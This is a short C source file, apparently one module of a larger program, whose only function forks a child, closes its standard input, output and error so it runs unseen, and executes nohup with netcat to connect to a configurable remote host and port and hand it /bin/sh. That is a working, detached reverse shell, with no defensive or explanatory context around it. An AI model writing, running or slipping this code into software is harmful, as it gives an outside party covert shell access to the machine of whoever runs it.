#include "lib.h"
#include "remote.h"

int	remote(void)
{
	pid_t pid;
	char *const para[] = {"/usr/bin/nohup",
		"/bin/nc", REMOTE_TARGET, REMOTE_PORT, "-c", "/bin/sh", REMOTE_EXEC,
			NULL};
	if ((pid = ft_fork()) == 0)
	{
		ft_close(0);
		ft_close(1);
		ft_close(2);
		ft_execve(para[0], para, NULL);
		ft_exit(0);
	}
	return (pid < -1);
}
